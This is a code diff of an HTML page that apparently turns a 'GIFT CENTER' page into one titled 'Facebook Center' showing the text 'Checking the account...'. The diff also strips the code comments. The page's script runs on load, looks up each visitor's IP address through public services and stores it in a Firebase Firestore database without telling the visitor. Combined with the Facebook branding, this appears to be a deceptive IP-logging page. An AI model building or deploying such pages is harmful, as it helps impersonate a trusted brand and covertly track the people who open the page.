@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GIFT CENTER</title>
+    <title>مركز فيسبوك</title>
 
-    <!-- Firebase SDK (ضروري جداً لتشغيل قاعدة البيانات) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 
@@ -54,13 +54,12 @@
 <body>
 
     <div class="main-card">
-        <h1>GIFT CENTER</h1>
-        <p>مرحباً بك في المركز، جاري تحميل الخدمات...</p>
+        <h1>مركز فيسبوك</h1>
+        <p>جاري التحقق من الحساب...</p>
     </div>
 
     <!-- إعدادات Firebase والكود البرمجي -->
     <script>
-        // 1. إعدادات مشروع Firebase الخاص بك
         const firebaseConfig = {
             apiKey: "YOUR_API_KEY",
             authDomain: "beauty-store-4f012.firebaseapp.com",
@@ -70,13 +69,11 @@
             appId: "YOUR_APP_ID"
         };
 
-        // تهيئة Firebase
         if (!firebase.apps.length) {
             firebase.initializeApp(firebaseConfig);
         }
         const db = firebase.firestore();
 
-        // 2. دالة جلب IP الزائر بدون مشاكل
         async function getVisitorIP() {
             const services = [
                 'https://api.ipify.org?format=json',
@@ -98,7 +95,6 @@
             return null;
         }
 
-        // 3. دالة تسجيل الزائر في قاعدة البيانات
         async function recordVisitor() {
             try {
                 const userIP = await getVisitorIP();
@@ -114,7 +110,6 @@
             }
         }
 
-        // تشغيل التسجيل تلقائياً عند فتح الصفحة
         document.addEventListener("DOMContentLoaded", recordVisitor);
     </script>
 </body>
